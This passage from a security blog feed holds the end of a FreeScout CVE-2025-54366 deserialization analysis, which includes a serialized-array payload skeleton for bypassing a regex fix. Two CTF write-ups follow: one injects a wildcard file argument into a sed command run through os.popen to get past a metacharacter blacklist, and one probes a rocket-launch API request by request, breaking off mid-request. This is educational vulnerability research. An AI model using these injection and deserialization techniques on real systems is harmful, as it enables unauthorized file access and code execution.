types<br>  <code>d:</code> - serialized double&#x2F;float<br>  <code>s:</code> - serialized string<br>  <code>a:</code> - serialized array<br>  It is missing two other types, i.e.<br>  <code>i:</code> - serialized integer<br>  <code>O:</code> - serialized object</li><li>If it starts with these 3 values it is supposed to serialize them but due to presence of <code>!</code> negation on preg_match it wont. This is still a bit of work in progress code as I understand it. The latest docker image and release <code>1.8.190</code> has the following code</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;#^[idsa]:#&quot;</span>, <span class="variable">$value</span>) || <span class="variable">$force_unserialize</span>) &#123;</span><br></pre></td></tr></table></figure><ul><li>This one allows any value that start with either of <code>idsa</code> and not objects as those could be our malicious payload.</li><li>This fix itself is not a great one. If someone manages to create an exploit based on serialized array instead of object. The value would look similar to <code>a:1:&#123;s:4:&quot;data&quot;;O:9:&quot;SomeClass&quot;:1:&#123;...&#125;&#125;</code>. The preg_match condition will now pass allowing deserialization of our payload leading to RCE again.</li></ul><p>Here are the recommended fixes </p><ol><li>Removing unsafe <code>unserialize()</code> calls if possible</li><li>Using JSON instead of PHP serialization or using json encode&#x2F;decode to safely create objects instead of trusting user inputs</li><li>Adding HMAC integrity validation</li><li>Implementing strict input validation - regex is one of the but you need to be very careful on how its implemented as situation like above can happen.</li></ol><h2 id="Exposure-on-the-Web"><a href="#Exposure-on-the-Web" class="headerlink" title="Exposure on the Web"></a>Exposure on the Web</h2><p>There are some 6K+ instances of freescout visible on fofa. Some of the are likely to be vulnerable if not updated since the disclosure.</p><p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/fofa.png" alt="fofa"></p><p>Similarly on Shodan we see some 1K instances.</p><p><img src="/Analyzing-CVE-2025-54366-RCE-via-Deserialization-of-untrusted-data/shodan.png" alt="shodan"></p><p>Since this exploit requires knowledge of APP_KEY as well having an authenticated user session, the exploitability&#x2F;likelihood reduces quite a bit. None the less, better patch than be sorry 😊</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>OWASP - <a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#language-agnostic-methods-for-deserializing-safely">Deserialization_Cheat_Sheet</a><br>OWASP - <a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#php">php deserialization fix</a><br>GitHub diff - <a href="https://github.com/freescout-help-desk/freescout/commit/e2de65f3f32f825b4ec5558643ed81438c9a6bc6">e2de65f3f32f825b4ec5558643ed81438c9a6bc6</a><br>GitHub Advisory - <a href="https://github.com/freescout-help-desk/freescout/security/advisories/GHSA-vcc2-6r66-gvvj">GHSA-vcc2-6r66-gvvj</a><br>GitHub Repo - <a href="https://github.com/synacktiv/laravel-crypto-killer">laravel-crypto-killer</a><br>GitHub Repo - <a href="https://github.com/ambionics/phpggc">phpggc</a><br>GitGuardian Blog <a href="https://blog.gitguardian.com/exploiting-public-app_key-leaks/">exploiting-public-app_key-leaks</a><br>Synacktiv Blog <a href="https://www.synacktiv.com/en/publications/laravel-appkey-leakage-analysis">laravel-appkey-leakage-analysis</a></p>]]></content>
      
      
      <categories>
          
          <category> vulnerability research </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> webappsec </tag>
            
            <tag> appsec </tag>
            
            <tag> laravel </tag>
            
            <tag> rce </tag>
            
            <tag> deserialization </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving SaaS from ImaginaryCTF 2021</title>
      <link href="/Solving-SaaS-from-ImaginaryCTF-2021/"/>
      <url>/Solving-SaaS-from-ImaginaryCTF-2021/</url>
      
        <content type="html"><![CDATA[<p>The CTF author’s note for this CTF challenge.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Sed as a Service! Now you can filter lorem ipsum to your heart&#x27;s desire!</span><br></pre></td></tr></table></figure><p>Attachment(source code) is provided along with the challenge URL. After visiting the URL we see a page to provide inputs to sed utility as shown below. Putting in some random input as per the provided syntax will output contents of some file.</p><p><img src="/Solving-SaaS-from-ImaginaryCTF-2021/16.1.jpg" alt="alt"><br><img src="/Solving-SaaS-from-ImaginaryCTF-2021/16.2.jpg" alt="alt"></p><p>Looking at the provided source code gives us some idea of how the input is processed. Lets go through the important parts of the code.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;|&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;;&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;$&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backend&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backend</span>():</span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">in</span> request.args[<span class="string">&#x27;query&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Stop hacking.\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> html.escape(os.popen(<span class="string">f&quot;sed <span class="subst">&#123;request.args[<span class="string">&#x27;query&#x27;</span>]&#125;</span> stuff.txt&quot;</span>).read())</span><br></pre></td></tr></table></figure><p>On line 13 we see a route to backend where our request gets sent. The code at line 16 than checks the blacklist mentioned at line 11 against our input in variable query.<br>If any of the blacklisted words are found our input will be rejected. Otherwise line 18 processes the input and returns the output.</p><p>My first thought was to see if I can get the code to execute any commands of my own by bypassing the blacklist. So I searched around for some resources that could help in that direction. After trying a few things I realized that executing my command might be difficult than I thought considering the blacklisted special characters which allows for chaining commands.</p><p>It was time to check other avenues to break the code. Having used sed utility a few times I realized that it outputs the contents of the provided file by default to show the changes. So as long as we are able to use it on flag file we should be able to retrieve its contents. Now we needed to figure out how to bypass the word flag. That was easy as most command injection bypass resources will highlight multiple methods to use common words in different ways.</p><p>For example linux command line will match fla? as flat or flap, so on and so forth. ? will be replaced by any character available in the list of files in this case. With that all we had to do is provide the input similar to the below and that gave us the flag. Sometimes we just need to use the provided options instead of bypassing them ;)</p><p><code>&#39;s/hello/hewwo/g&#39; fl?g.txt</code></p><p><img src="/Solving-SaaS-from-ImaginaryCTF-2021/16.3.jpg" alt="alt"></p><p>That was a nice little chal from the Imaginary CTF team. Thanks to them. Feel free to ping me on twitter for feedback or queries.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webappsec </tag>
            
            <tag> writeup </tag>
            
            <tag> linux </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Solving Apollo 1337 from San Diego CTF 2021</title>
      <link href="/solving-apollo-1337-from-san-diego-ctf-2021/"/>
      <url>/solving-apollo-1337-from-san-diego-ctf-2021/</url>
      
        <content type="html"><![CDATA[<p>The author’s note for this CTF challenge.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Apollo 1337</span><br><span class="line">Hey there intern! We have a rocket launch scheduled for noon today and the launch interface is down. You&#x27;ll need to directly use the API to launch the rocket. No, we don&#x27;t have any documentation. And     quickly, our shareholders are watching!</span><br><span class="line">Website</span><br><span class="line">https://space.sdc.tf/</span><br></pre></td></tr></table></figure><p>Visiting the website shows below page indicating frontend and backend status for the website.</p><p><img src="/solving-apollo-1337-from-san-diego-ctf-2021/15.1.jpg" alt="alt"></p><p>As mentioned in the challenge note we will need to use the API, so lets look at the requests generated. We see a status API showing information about the health of the services.</p><p>Request:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /api/status?verbose= HTTP/2</span><br><span class="line">Host: space.sdc.tf</span><br><span class="line">Cookie: __cfduid=d78c68cc9fdea32fb380f38f0ab1825a21620452158</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://space.sdc.tf/</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 200 OK</span><br><span class="line">Date: Mon, 10 May 2021 04:26:50 GMT</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Etag: W/&quot;62-Psu3r0I1RtWvipMsnje4R4c3EqQ&quot;</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Via: 1.1 google</span><br><span class="line">Cf-Cache-Status: DYNAMIC</span><br><span class="line">Cf-Request-Id: 09f6202db000004ae6c5a60000000001</span><br><span class="line">Expect-Ct: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br><span class="line">Report-To: &#123;&quot;endpoints&quot;:[&#123;&quot;url&quot;:&quot;https:\/\/a.nel.cloudflare.com\/report?s=WDZCmPIVBqPrVD05F5RqOiX74KykdTJ7WtAttSKScS439NAfEhz34z63qWUzQU0jZCdY3cwvA3nsVH%2BZ8QCtuSYfqsGPJdYhYRB6f9A%3D&quot;&#125;],&quot;group&quot;:&quot;cf-nel&quot;,&quot;max_age&quot;:604800&#125;</span><br><span class="line">Nel: &#123;&quot;report_to&quot;:&quot;cf-nel&quot;,&quot;max_age&quot;:604800&#125;</span><br><span class="line">Server: cloudflare</span><br><span class="line">Cf-Ray: 64d0695c49ad4ae6-HYD</span><br><span class="line">Alt-Svc: h3-27=&quot;:443&quot;; ma=86400, h3-28=&quot;:443&quot;; ma=86400, h3-29=&quot;:443&quot;; ma=86400</span><br><span class="line"></span><br><span class="line">&#123;&quot;status&quot;:&quot;health&quot;,&quot;longStatus&quot;:&quot;Healthy. All routes are functioning properly.&quot;,&quot;version&quot;:&quot;1.0.0&quot;&#125;</span><br></pre></td></tr></table></figure><p>Not much information available here. You will notice a get parameter verbose with no value in the request. If you have used sqlmap or such tools you would notice verbosity usually ranges from 1 to n depending on the tool. So lets try providing 1 as value for the verbose parameter.</p><p>Request:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /api/status?verbose=1 HTTP/2</span><br><span class="line">Host: space.sdc.tf</span><br><span class="line">Cookie: __cfduid=d78c68cc9fdea32fb380f38f0ab1825a21620452158</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://space.sdc.tf/</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 200 OK</span><br><span class="line">Date: Sat, 08 May 2021 06:08:53 GMT</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Etag: W/&quot;e3-jMu7i7AkcsLoz7i0SVBQzLxLr4I&quot;</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Via: 1.1 google</span><br><span class="line">Cf-Cache-Status: DYNAMIC</span><br><span class="line">Cf-Request-Id: 09ec30e10100002e779a2f6000000001</span><br><span class="line">Expect-Ct: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br><span class="line">Report-To: &#123;&quot;group&quot;:&quot;cf-nel&quot;,&quot;max_age&quot;:604800,&quot;endpoints&quot;:[&#123;&quot;url&quot;:&quot;https:\/\/a.nel.cloudflare.com\/report?s=MJvYv4dKRoKmfL5Jv%2Fx%2B0QhcW5XFEffkA9JYcDYdVF4bdgi8cPDgqEb5Rng4OxAg4myNma5%2BPgzeK0TnSqtb8XNy%2FhwNaPKwzZZIAds%3D&quot;&#125;]&#125;</span><br><span class="line">Nel: &#123;&quot;report_to&quot;:&quot;cf-nel&quot;,&quot;max_age&quot;:604800&#125;</span><br><span class="line">Server: cloudflare</span><br><span class="line">Cf-Ray: 64c08414cb452e77-BOM</span><br><span class="line">Alt-Svc: h3-27=&quot;:443&quot;; ma=86400, h3-28=&quot;:443&quot;; ma=86400, h3-29=&quot;:443&quot;; ma=86400</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">   &quot;status&quot;:&quot;health&quot;,</span><br><span class="line">   &quot;longStatus&quot;:&quot;Healthy. All routes are functioning properly.&quot;,</span><br><span class="line">   &quot;version&quot;:&quot;1.0.0&quot;,</span><br><span class="line">   &quot;routes&quot;:[</span><br><span class="line">      &#123;</span><br><span class="line">     &quot;path&quot;:&quot;/status&quot;,</span><br><span class="line">     &quot;status&quot;:&quot;healthy&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">     &quot;path&quot;:&quot;/rocketLaunch&quot;,</span><br><span class="line">     &quot;status&quot;:&quot;healthy&quot;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">     &quot;path&quot;:&quot;/fuel&quot;,</span><br><span class="line">     &quot;status&quot;:&quot;healthy&quot;</span><br><span class="line">      &#125;</span><br><span class="line">   ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now we see a lot more information available to us, which includes 2 new endpoints - &#x2F;rocketLaunch and &#x2F;fuel. Lets query the &#x2F;rocketLaunch endpoint.</p><p>Request:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /api/rocketLaunch HTTP/2</span><br><span class="line">Host: space.sdc.tf</span><br><span class="line">Cookie: __cfduid=d78c68cc9fdea32fb380f38f0ab1825a21620452158</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://space.sdc.tf/</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 400 Bad Request</span><br><span class="line">Date: Sat, 08 May 2021 05:39:30 GMT</span><br><span class="line">Content-Length: 25</span><br><span class="line">Etag: &quot;19-SVOfstlPsXCdH4leAIVRqoZbYqg&quot;</span><br><span class="line">Via: 1.1 google</span><br><span class="line">Cf-Cache-Status: DYNAMIC</span><br><span class="line">Cf-Request-Id: 09ec16012700004ada98104000000001</span><br><span class="line">Expect-Ct: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br><span class="line">Report-To: &#123;&quot;max_age&quot;:604800,&quot;group&quot;:&quot;cf-nel&quot;,&quot;endpoints&quot;:[&#123;&quot;url&quot;:&quot;https:\/\/a.nel.cloudflare.com\/report?s=hI2Bwnxp19DS3Ab9SnIWpCZJ9s1wgOZhERFWg5VMdLFlDLH4R57JOb7MncfLZN3px%2Bb%2BDUX%2FMvK%2FU73NPDhWIt7hls1WGzFSbf%2BDqDI%3D&quot;&#125;]&#125;</span><br><span class="line">Nel: &#123;&quot;max_age&quot;:604800,&quot;report_to&quot;:&quot;cf-nel&quot;&#125;</span><br><span class="line">Server: cloudflare</span><br><span class="line">Cf-Ray: 64c0591508c54ada-HYD</span><br><span class="line">Alt-Svc: h3-27=&quot;:443&quot;; ma=86400, h3-28=&quot;:443&quot;; ma=86400, h3-29=&quot;:443&quot;; ma=86400</span><br><span class="line"></span><br><span class="line">request body must be json</span><br></pre></td></tr></table></figure><p>We get an error suggesting that the request body must be json. So lets go ahead and do that. From here on the challenge is all about troubleshooting based on the errors we get. We add Content-Type: application&#x2F;json and a json body to the request as well as making it a POST request since it requires a request body.</p><p>Request:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/rocketLaunch HTTP/2</span><br><span class="line">Host: space.sdc.tf</span><br><span class="line">Cookie: __cfduid=d78c68cc9fdea32fb380f38f0ab1825a21620452158</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://space.sdc.tf/</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 9</span><br><span class="line"></span><br><span class="line">&#123;&quot;x&quot;:&quot;y&quot;&#125;</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">HTTP/2 400 Bad Request</span><br><span class="line">Date: Sat, 08 May 2021 05:42:51 GMT</span><br><span class="line">Content-Length: 20</span><br><span class="line">Etag: &quot;14-TBPT3N4WkgaLR8mc0RAXcU26ZAM&quot;</span><br><span class="line">Via: 1.1 google</span><br><span class="line">Cf-Cache-Status: DYNAMIC</span><br><span class="line">Cf-Request-Id: 09ec1911d300004aed96084000000001</span><br><span class="line">Expect-Ct: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br><span class="line">Report-To: &#123;&quot;group&quot;:&quot;cf-nel&quot;,&quot;endpoints&quot;:[&#123;&quot;url&quot;:&quot;https:\/\/a.nel.cloudflare.com\/report?s=VqP%2FgdJ1wT7IEcEOMkYveux7cy%2F0pihioWDUg%2FO3ifwNRmyxT4gxi8vGEKSTRU8iwExg5mVjVqVOU2yIUwrP%2FSVaUXgVnNx99bDnEHA%3D&quot;&#125;],&quot;max_age&quot;:604800&#125;</span><br><span class="line">Nel: &#123;&quot;report_to&quot;:&quot;cf-nel&quot;,&quot;max_age&quot;:604800&#125;</span><br><span class="line">Server: cloudflare</span><br><span class="line">Cf-Ray: 64c05dfc8c304aed-HYD</span><br><span class="line">Alt-Svc: h3-27=&quot;:443&quot;; ma=86400, h3-28=&quot;:443&quot;; ma=86400, h3-29=&quot;:443&quot;; ma=86400</span><br><span class="line"></span><br><span class="line">rocket not specified</span><br></pre></td></tr></table></figure><p>We get another error asking us to add a rocket. So lets do that.</p><p>Request:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/rocketLaunch HTTP/2</span><br><span class="line">Host: space.sdc.tf</span><br><span class="line">Cookie: __cfduid=d78c68cc9fdea32fb380f38f0ab1825a21620452158</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://space.sdc.tf/</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 14</span><br><span class="line"></span><br><span class="line">&#123;&quot;rocket&quot;:&quot;y&quot;&#125;</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 400 Bad Request</span><br><span class="line">Date: Sat, 08 May 2021 05:43:02 GMT</span><br><span class="line">Content-Length: 41</span><br><span class="line">Etag: &quot;29-IJrJmM4FBfsLZi5Mi6TsnwYBLdY&quot;</span><br><span class="line">Via: 1.1 google</span><br><span class="line">Cf-Cache-Status: DYNAMIC</span><br><span class="line">Cf-Request-Id: 09ec193a8700004aed7433d000000001</span><br><span class="line">Expect-Ct: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br><span class="line">Report-To: &#123;&quot;group&quot;:&quot;cf-nel&quot;,&quot;endpoints&quot;:[&#123;&quot;url&quot;:&quot;https:\/\/a.nel.cloudflare.com\/report?s=PcLh8HANUGlbAHr1kaVAUzvAv2qT0yCg5VMOY%2BFo39sa%2F7klwj3ss%2FttQBSyCE8%2BrXkWcXf4nvCt4J8OeyHE6ffQCU3k%2BBjSyJgPcMo%3D&quot;&#125;],&quot;max_age&quot;:604800&#125;</span><br><span class="line">Nel: &#123;&quot;report_to&quot;:&quot;cf-nel&quot;,&quot;max_age&quot;:604800&#125;</span><br><span class="line">Server: cloudflare</span><br><span class="line">Cf-Ray: 64c05e3dab4f4aed-HYD</span><br><span class="line">Alt-Svc: h3-27=&quot;:443&quot;; ma=86400, h3-28=&quot;:443&quot;; ma=86400, h3-29=&quot;:443&quot;; ma=86400</span><br><span class="line"></span><br><span class="line">rocket not recognized (available: triton)</span><br></pre></td></tr></table></figure><p>Since the rocket name is not correct, the error provides us with the name which we can use.</p><p>Request:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /api/rocketLaunch HTTP/2</span><br><span class="line">Host: space.sdc.tf</span><br><span class="line">Cookie: __cfduid=d78c68cc9fdea32fb380f38f0ab1825a21620452158</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://space.sdc.tf/</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 19</span><br><span class="line"></span><br><span class="line">&#123;&quot;rocket&quot;:&quot;triton&quot;&#125;</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 400 Bad Request</span><br><span class="line">Date: Sat, 08 May 2021 05:43:11 GMT</span><br><span class="line">Content-Length: 24</span><br><span class="line">Etag: &quot;18-4SZ7qR96LADOnmIcaDt9Ocnl2bE&quot;</span><br><span class="line">Via: 1.1 google</span><br><span class="line">Cf-Cache-Status: DYNAMIC</span><br><span class="line">Cf-Request-Id: 09ec195ebc00004aed5485e000000001</span><br><span class="line">Expect-Ct: max-age=604800, report-uri=&quot;https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct&quot;</span><br><span class="line">Report-To: &#123;&quot;group&quot;:&quot;cf-nel&quot;,&quot;endpoints&quot;:[&#123;&quot;url&quot;:&quot;https:\/\/a.nel.cloudflare.com\/report?s=jCFFlnfNbKeXYqFkEYm6CQrgxeyYH9sdDK8yk9NRI4eQYF0cgQLJsGVAWP417GFmaWoGSyKdBKgggJZokHLUNZZz2sDwYYAg9WW8KyA%3D&quot;&#125;],&quot;max_age&quot;:604800&#125;</span><br><span class="line">Nel: &#123;&quot;report_to&quot;:&quot;cf-nel&quot;,&quot;max_age&quot;:604800&#125;</span><br><span class="line">Server: cloudflare</span><br><span class="line">Cf-Ray: 64c05e77993c4aed-HYD</span><br><span class="line">Alt-Svc: h3-27=&quot;:443&quot;; ma=86400, h3-28=&quot;:443&quot;; ma=86400, h3-29=&quot;:443&quot;; ma=86400</span><br><span class="line"></span><br><span class="line">launchTime not specified</span><br></pre></td></tr></table></figure><p>Further error wants us to specify the launch time. After resolving few more errors such as launchTime not in hh:mm format and launchTime unapproved I was able to get a proper request going. Launch time is noon based on the challenge description. Any other time would result in unapproved error. We could have also tried the server date&#x2F;time based on the response to see if it works if 12:00 was not working.</p><p>Request:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST 